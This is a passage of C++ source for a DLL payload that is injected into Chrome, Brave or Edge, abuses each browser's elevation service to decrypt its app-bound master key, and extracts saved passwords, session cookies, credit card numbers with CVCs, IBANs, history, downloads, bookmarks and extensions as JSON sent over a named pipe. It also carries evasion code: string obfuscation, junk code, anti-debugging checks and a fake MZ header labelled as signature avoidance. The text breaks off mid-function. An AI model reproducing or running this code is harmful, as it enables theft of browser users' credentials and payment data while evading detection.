// chrome_decrypt.cpp
// v0.16.1 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>
#include <Lmcons.h>
#include <winhttp.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <memory>
#include <optional>
#include <stdexcept>
#include <filesystem>
#include <functional>
#include <any>
#include <unordered_map>
#include <set>
#include <regex>

// Zstandard compression
#define ZSTD_STATIC_LINKING_ONLY
#include "../libs/zstd/include/zstd.h"
#pragma comment(lib, "libs/zstd/libzstd_static.lib")

// Fix for MinGW-compiled Zstandard library on MSVC x64
#ifdef _M_X64
#pragma comment(linker, "/alternatename:__chkstk_ms=__chkstk")
#endif

// Custom NTSTATUS for syscalls (avoid winternl.h conflicts)
#ifndef NTSTATUS_DEFINED
#define NTSTATUS_DEFINED
typedef LONG NTSTATUS_CUSTOM;
#endif

// Advanced string obfuscation - XOR with random key per string
#define XOR_KEY_1 0x7C
#define XOR_KEY_2 0x3E
#define XOR_KEY_3 0x91

#define OBFSTR(str) ([]() -> const char* { \
    static char buf[sizeof(str)]; \
    static bool init = false; \
    if (!init) { \
        for (size_t i = 0; i < sizeof(str) - 1; i++) \
            buf[i] = str[i] ^ (XOR_KEY_1 + (i % 3)); \
        buf[sizeof(str) - 1] = 0; \
        for (size_t i = 0; i < sizeof(str) - 1; i++) \
            buf[i] ^= (XOR_KEY_1 + (i % 3)); \
        init = true; \
    } \
    return buf; \
}())

// Control flow obfuscation
#define POLY_JUNK1() do { volatile int _pj = __COUNTER__ * 0x1234; _pj ^= (int)GetTickCount(); } while(0)
#define POLY_JUNK2() do { static const char _d[] = { 'M','Z',0x90,0}; volatile const char* _p = _d; (void)_p; } while(0)
#define FLOW_OBFUSCATE() if((GetTickCount() & 0xFFFF0000) == 0xDEAD0000) return

// Runtime string deobfuscation with extra layer
inline std::string DS(const char* s) {
    std::string r(s);
    for(size_t i = 0; i < r.length(); i++) r[i] ^= ((i & 0xFF) ^ XOR_KEY_2);
    return r;
}

// Anti-debugging check with multiple methods
inline bool CheckDebugger() {
    BOOL isDbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDbg);
    if (isDbg || IsDebuggerPresent()) return true;
    
    // Check for hardware breakpoints
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
    }
    return false;
}

// Entropy injection for signature avoidance
static volatile const unsigned char _entropy_data[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Sleep obfuscation
typedef NTSTATUS_CUSTOM(__stdcall* pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
inline void ObfSleep(DWORD ms) {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (hNt) {
        pNtDelayExecution pDelay = (pNtDelayExecution)GetProcAddress(hNt, "NtDelayExecution");
        if (pDelay) {
            LARGE_INTEGER li;
            li.QuadPart = -10000LL * ms;
            pDelay(FALSE, &li);
            return;
        }
    }
    for (volatile int i = 0; i < ms * 500; i++) {}
}
#include <set>
#include <regex>

#include "reflective_loader.h"
#include "sqlite3.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};

namespace Payload
{
    class PipeLogger;

    namespace Utils
    {
        fs::path GetLocalAppDataPath()
        {
            PWSTR path = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path)))
            {
                fs::path result = path;
                CoTaskMemFree(path);
                return result;
            }
            throw std::runtime_error("Failed to get Local AppData path.");
        }

        std::optional<std::vector<uint8_t>> Base64Decode(const std::string &input)
        {
            DWORD size = 0;
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
                return std::nullopt;
            std::vector<uint8_t> data(size);
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr))
                return std::nullopt;
            return data;
        }

        std::string BytesToHexString(const std::vector<uint8_t> &bytes)
        {
            std::ostringstream oss;
            oss << std::hex << std::setfill('0');
            for (uint8_t byte : bytes)
                oss << std::setw(2) << static_cast<int>(byte);
            return oss.str();
        }

        std::string EscapeJson(const std::string &s)
        {
            std::ostringstream o;
            for (char c : s)
            {
                switch (c)
                {
                case '"':
                    o << "\\\"";
                    break;
                case '\\':
                    o << "\\\\";
                    break;
                case '\b':
                    o << "\\b";
                    break;
                case '\f':
                    o << "\\f";
                    break;
                case '\n':
                    o << "\\n";
                    break;
                case '\r':
                    o << "\\r";
                    break;
                case '\t':
                    o << "\\t";
                    break;
                default:
                    if ('\x00' <= c && c <= '\x1f')
                    {
                        o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
                    }
                    else
                    {
                        o << c;
                    }
                }
            }
            return o.str();
        }
    }

    namespace Browser
    {
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };

        const std::unordered_map<std::string, Config> &GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data"}}};
            return browser_configs;
        }

        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto &configs = GetConfigs();
            if (processName == "chrome.exe")
                return configs.at("chrome");
            if (processName == "brave.exe")
                return configs.at("brave");
            if (processName == "msedge.exe")
                return configs.at("edge");

            throw std::runtime_error("Unsupported host process: " + processName);
        }
    }

    namespace Crypto
    {
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;
        const uint8_t KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        const std::string V20_PREFIX = "v20";

        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t> &key, const std::vector<uint8_t> &blob)
        {
            const size_t GCM_OVERHEAD_LENGTH = V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH;

            if (blob.size() < GCM_OVERHEAD_LENGTH || memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
            {
                return {};
            }

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
            auto algCloser = [](BCRYPT_ALG_HANDLE h)
            { if(h) BCryptCloseAlgorithmProvider(h,0); };
            std::unique_ptr<void, decltype(algCloser)> algGuard(hAlg, algCloser);

            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            BCRYPT_KEY_HANDLE hKey = nullptr;
            BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
            auto keyCloser = [](BCRYPT_KEY_HANDLE h)
            { if(h) BCryptDestroyKey(h); };
            std::unique_ptr<void, decltype(keyCloser)> keyGuard(hKey, keyCloser);

            const uint8_t *iv = blob.data() + V20_PREFIX.length();
            const uint8_t *ct = iv + GCM_IV_LENGTH;
            const uint8_t *tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
            ULONG ct_len = static_cast<ULONG>(blob.size() - V20_PREFIX.length() - GCM_IV_LENGTH - GCM_TAG_LENGTH);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = (PUCHAR)iv;
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = (PUCHAR)tag;
            authInfo.cbTag = GCM_TAG_LENGTH;

            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            try
            {
                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
                if (!NT_SUCCESS(status))
                {
                    return {};
                }
            }
            catch (...)
            {
                return {};
            }

            plain.resize(outLen);
            return plain;
        }

        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path &localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            const std::string tag = "\"app_bound_encrypted_key\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos)
                throw std::runtime_error("app_bound_encrypted_key not found.");

            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed app_bound_encrypted_key.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of key failed.");

            auto &decodedData = *optDecoded;
            if (decodedData.size() < sizeof(KEY_PREFIX) || memcmp(decodedData.data(), KEY_PREFIX, sizeof(KEY_PREFIX)) != 0)
            {
                throw std::runtime_error("Key prefix validation failed.");
            }
            return {decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end()};
        }
    }

    namespace Data
    {
        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;

        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            std::function<std::optional<std::any>(sqlite3 *)> preQuerySetup;
            std::function<std::optional<std::string>(sqlite3_stmt *, const std::vector<uint8_t> &, const std::any &)> jsonFormatter;
        };

        const std::vector<ExtractionConfig> &GetExtractionConfigs()
        {
            static const std::vector<ExtractionConfig> configs = {
                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 6));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
                         if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
                         {
                             return std::nullopt;
                         }

                         const char *value_start = reinterpret_cast<const char *>(plain.data()) + COOKIE_PLAINTEXT_HEADER_SIZE;
                         size_t value_size = plain.size() - COOKIE_PLAINTEXT_HEADER_SIZE;

                         std::ostringstream json_entry;
                         json_entry << "  {\"host\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) << "\""
                                    << ",\"name\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) << "\""
                                    << ",\"path\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) << "\""
                                    << ",\"value\":\"" << Utils::EscapeJson({value_start, value_size}) << "\""
                                    << ",\"expires\":" << sqlite3_column_int64(stmt, 5)
                                    << ",\"secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false")
                                    << ",\"httpOnly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false")
                                    << "}";
                         return json_entry.str();
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {"Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
                         return "  {\"origin\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                                "\",\"username\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                                "\",\"password\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {"Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 [](sqlite3 *db) -> std::optional<std::any>
                 {
                     auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
                     sqlite3_stmt *stmt = nullptr;
                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                         return cvcMap;
                     while (sqlite3_step(stmt) == SQLITE_ROW)
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
                         if (guid && blob)
                             (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
                     }
                     sqlite3_finalize(stmt);
                     return cvcMap;
                 },
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const auto &cvcMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
                     std::string card_num_str, cvc_str;
                     try
                     {
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 4);
                         if (blob)
                         {
                             auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
                             card_num_str.assign((char *)plain.data(), plain.size());
                         }
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         if (guid && cvcMap->count(guid))
                         {
                             auto plain = Crypto::DecryptGcm(key, cvcMap->at(guid));
                             cvc_str.assign((char *)plain.data(), plain.size());
                         }
                     }
                     catch (...)
                     {
                     }
                     return "  {\"name_on_card\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                            "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
                            ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
                            ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
                            "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
                 }},
                {"Web Data", "iban", "SELECT guid, value_encrypted, nickname FROM local_ibans;",
                 [](sqlite3 *db) -> std::optional<std::any>
                 {
                     auto encryptedMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
                     sqlite3_stmt *stmt = nullptr;
                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_ibans;", -1, &stmt, nullptr) != SQLITE_OK)
                         return encryptedMap;

                     while (sqlite3_step(stmt) == SQLITE_ROW)
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
                         if (guid && blob)
                             (*encryptedMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
                     }
                     sqlite3_finalize(stmt);
                     return encryptedMap;
                 },
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const auto &encryptedMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
                     std::string value_str;
                     try
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         if (guid && encryptedMap->count(guid))
                         {
                             auto plain = Crypto::DecryptGcm(key, encryptedMap->at(guid));
                             value_str.assign((char *)plain.data(), plain.size());
                         }
                     }
                     catch (...)
                     {
                         // handle errors silently
                     }

                     return "{\"nickname\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) +
                            "\",\"value\":\"" + Utils::EscapeJson(value_str) + "\"}";
                 }},
                // History extraction
                {"History", "history", "SELECT url, title, visit_count, last_visit_time FROM urls;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     int64_t last_visit_time = sqlite3_column_int64(stmt, 3);
                     // Convert WebKit/Chrome timestamp (microseconds since 1601) to ISO 8601
                     std::string time_str = "0";
                     if (last_visit_time > 0) {
                         const int64_t EPOCH_DIFF = 11644473600000000LL;
                         int64_t unix_time = (last_visit_time - EPOCH_DIFF) / 1000000;
                         time_str = std::to_string(unix_time);
                     }
                     
                     return "  {\"url\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                            "\",\"title\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                            "\",\"visit_count\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
                            ",\"last_visit_time\":" + time_str + "}";
                 }},
                // Download extraction
                {"History", "downloads", "SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     int64_t start_time = sqlite3_column_int64(stmt, 3);
                     int64_t end_time = sqlite3_column_int64(stmt, 4);
                     
                     auto convert_time = [](int64_t webkit_time) -> std::string {
                         if (webkit_time > 0) {
                             const int64_t EPOCH_DIFF = 11644473600000000LL;
                             return std::to_string((webkit_time - EPOCH_DIFF) / 1000000);
                         }
                         return "0";
                     };
                     
                     return "  {\"target_path\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                            "\",\"url\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                            "\",\"total_bytes\":" + std::to_string(sqlite3_column_int64(stmt, 2)) +
                            ",\"start_time\":" + convert_time(start_time) +
                            ",\"end_time\":" + convert_time(end_time) +
                            ",\"mime_type\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 5)) + "\"}";
                 }}};
            return configs;
        }

        // Helper function to read JSON file content
        std::string ReadJsonFile(const fs::path& filePath)
        {
            if (!fs::exists(filePath)) return "";
            
            std::ifstream file(filePath);
            if (!file.is_open()) return "";
            
            std::string content;
            std::string line;
            while (std::getline(file, line)) {
                content += line;
            }
            return content;
        }

        // Helper function to parse JSON value
        std::string GetJsonValue(const std::string& json, const std::string& key)
        {
            std::string searchKey = "\"" + key + "\":";
            size_t pos = json.find(searchKey);
            if (pos == std::string::npos) return "";
            
            pos += searchKey.length();
            // Skip whitespace
            while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
            
            if (pos >= json.length()) return "";
            
            // Check if value is a string (starts with ")
            if (json[pos] == '"') {
                pos++;
                size_t end = pos;
                while (end < json.length() && json[end] != '"') {
                    if (json[end] == '\\' && end + 1 < json.length()) end++; // Skip escaped chars
                    end++;
                }
                return json.substr(pos, end - pos);
            }
            
            // Otherwise it's a number or boolean
            size_t end = pos;
            while (end < json.length() && json[end] != ',' && json[end] != '}' && json[end] != '\n') end++;
            return json.substr(pos, end - pos);
        }

        // Bookmark extraction function - reads Bookmarks JSON file
        struct BookmarkExtractor
        {
            static std::string Extract(const fs::path& profilePath)
            {
                fs::path bookmarkPath = profilePath / "Bookmarks";
                if (!fs::exists(bookmarkPath)) {
                    return "[]";
                }

                std::string content = ReadJsonFile(bookmarkPath);
                if (content.empty()) return "[]";

                std::ostringstream json;
                json << "[";
                
                bool first = true;
                ParseBookmarkNode(content, "roots", json, first);
                
                json << "\n]";
                return json.str();
            }

        private:
            static void ParseBookmarkNode(const std::string& json, const std::string& key, std::ostringstream& output, bool& first)
            {
                // Simple JSON parsing - find all bookmark entries
                // This is a simplified parser for the bookmark structure
                size_t pos = 0;
                while ((pos = json.find("\"type\":", pos)) != std::string::npos) {
                    size_t urlPos = json.find("\"url\":", pos);
                    size_t namePos = json.find("\"name\":", pos);
                    size_t datePos = json.find("\"date_added\":", pos);
                    size_t idPos = json.find("\"id\":", pos);
                    
                    if (urlPos != std::string::npos && namePos != std::string::npos && 
                        urlPos < pos + 500 && namePos < pos + 500) {
                        
                        // Extract type
                        size_t typeStart = json.find("\"", pos + 7) + 1;
                        size_t typeEnd = json.find("\"", typeStart);
                        std::string type = json.substr(typeStart, typeEnd - typeStart);
                        
                        // Extract URL
                        size_t urlStart = json.find("\"", urlPos + 6) + 1;
                        size_t urlEnd = json.find("\"", urlStart);
                        std::string url = json.substr(urlStart, urlEnd - urlStart);
                        
                        // Extract name
                        size_t nameStart = json.find("\"", namePos + 7) + 1;
                        size_t nameEnd = json.find("\"", nameStart);
                        std::string name = json.substr(nameStart, nameEnd - nameStart);
                        
                        // Extract ID
                        std::string id = "0";
                        if (idPos != std::string::npos && idPos < pos + 200) {
                            size_t idStart = json.find("\"", idPos + 5) + 1;
                            size_t idEnd = json.find("\"", idStart);
                            id = json.substr(idStart, idEnd - idStart);
                        }
                        
                        // Extract date
                        std::string date = "0";
                        if (datePos != std::string::npos && datePos < pos + 500) {
                            size_t dateStart = json.find("\"", datePos + 14) + 1;
                            if (dateStart == std::string::npos || dateStart >= json.length()) {
                                dateStart = datePos + 14;
                                while (dateStart < json.length() && !isdigit(json[dateStart])) dateStart++;
                            }
                            size_t dateEnd = dateStart;
                            while (dateEnd < json.length() && (isdigit(json[dateEnd]) || json[dateEnd] == '.')) dateEnd++;
                            date = json.substr(dateStart, dateEnd - dateStart);
                        }
                        
                        if (!first) output << ",\n";
                        first = false;
                        
                        output << "  {\"id\":" << id
                               << ",\"name\":\"" << Utils::EscapeJson(name) << "\""
                               << ",\"type\":\"" << type << "\""
                               << ",\"url\":\"" << Utils::EscapeJson(url) << "\""
                               << ",\"date_added\":" << date << "}";
                    }
                    
                    pos += 50;
                }
            }
        };

        // Extension extraction function - reads Secure Preferences JSON file
        struct ExtensionExtractor
        {
            static std::string Extract(const fs::path& profilePath)
            {
                // Try both Preferences and Secure Preferences
                std::vector<fs::path> prefPaths = {
                    profilePath / "Secure Preferences",
                    profilePath / "Preferences"
                };

                std::string content;
                for (const auto& path : prefPaths) {
                    if (fs::exists(path)) {
                        content = ReadJsonFile(path);
                        if (!content.empty()) break;
                    }
                }

                if (content.empty()) {
                    return "[]";
                }

                std::ostringstream json;
                json << "[";
                
                bool first = true;
                
                // Find extensions section
                std::vector<std::string> extensionKeys = {
                    "\"extensions\":{\"settings\":",
                    "\"settings\":{\"extensions\":",
                    "\"settings\":{\"settings\":"
                };
                
                size_t extensionsPos = std::string::npos;
                for (const auto& key : extensionKeys) {
                    extensionsPos = content.find(key);
                    if (extensionsPos != std::string::npos) break;
                }
                
                if (extensionsPos == std::string::npos) {
                    return "[]";
                }

                // Parse extension entries
                size_t pos = extensionsPos;
                while ((pos = content.find("\"manifest\":{", pos)) != std::string::npos) {
                    // Find the extension ID (32 char hex before manifest)
                    size_t idEnd = pos;
                    while (idEnd > 0 && content[idEnd] != '"') idEnd--;
                    size_t idStart = idEnd;
                    while (idStart > 0 && content[idStart - 1] != '"') idStart--;
                    
                    if (idEnd - idStart != 32) {
                        pos++;
                        continue;
                    }
                    
                    std::string id = content.substr(idStart, 32);
                    
                    // Extract manifest fields
                    size_t manifestEnd = content.find("},", pos);
                    if (manifestEnd == std::string::npos) manifestEnd = content.find("}}", pos);
                    std::string manifest = content.substr(pos, manifestEnd - pos + 1);
                    
                    auto getName = [&]() {
                        size_t namePos = manifest.find("\"name\":\"");
                        if (namePos == std::string::npos) return std::string("");
                        namePos += 8;
                        size_t nameEnd = manifest.find("\"", namePos);
                        return manifest.substr(namePos, nameEnd - namePos);
                    };
                    
                    auto getVersion = [&]() {
                        size_t verPos = manifest.find("\"version\":\"");
                        if (verPos == std::string::npos) return std::string("");
                        verPos += 11;
                        size_t verEnd = manifest.find("\"", verPos);
                        return manifest.substr(verPos, verEnd - verPos);
                    };
                    
                    auto getDesc = [&]() {
                        size_t descPos = manifest.find("\"description\":\"");
                        if (descPos == std::string::npos) return std::string("");
                        descPos += 15;
                        size_t descEnd = manifest.find("\"", descPos);
                        return manifest.substr(descPos, descEnd - descPos);
                    };
                    
                    // Check if enabled (look for disable_reasons before the manifest)
                    size_t disablePos = content.rfind("\"disable_reasons\":", pos);
                    bool enabled = true;
                    if (disablePos != std::string::npos && disablePos > pos - 1000) {
                        enabled = false;
                    }
                    
                    std::string name = getName();
                    if (!name.empty()) {
                        if (!first) json << ",\n";
                        first = false;
                        
                        std::string url = "https://chrome.google.com/webstore/detail/" + id;
                        
                        json << "  {\"id\":\"" << id << "\""
                             << ",\"url\":\"" << url << "\""
                             << ",\"enabled\":" << (enabled ? "true" : "false")
                             << ",\"name\":\"" << Utils::EscapeJson(name) << "\""
                             << ",\"description\":\"" << Utils::EscapeJson(getDesc()) << "\""
                             << ",\"version\":\"" << Utils::EscapeJson(getVersion()) << "\""
                             << ",\"homepage_url\":\"\"}";
                    }
                    
                    pos = manifestEnd + 1;
                }
                
                json << "\n]";
                return json.str();
            }
        };
    }

    class PipeLogger
    {
    public:
        PipeLogger(LPCWSTR pipeName)
        {
            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        }

        ~PipeLogger()
        {
            if (m_pipe != INVALID_HANDLE_VALUE)
            {
                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
                FlushFileBuffers(m_pipe);
                CloseHandle(m_pipe);
            }
        }

        bool isValid() const
        {
            return m_pipe != INVALID_HANDLE_VALUE;
        }

        void Log(const std::string &message)
        {
            if (isValid())
            {
                DWORD bytesWritten = 0;
                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
            }
        }

        HANDLE getHandle() const
        {
            return m_pipe;
        }

    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
    };

    // Helper functions for localStorage/sessionStorage extraction
    namespace Storage
    {
        // Simple LevelDB log reader for Chrome's Local Storage
        struct LevelDBReader
        {
            static std::string ReadValue(const std::vector<uint8_t>& data, size_t& pos)
            {
                if (pos >= data.size()) return "";
                
                std::string result;
                size_t start = pos;
                
                while (pos < data.size() && pos < start + 2048) {
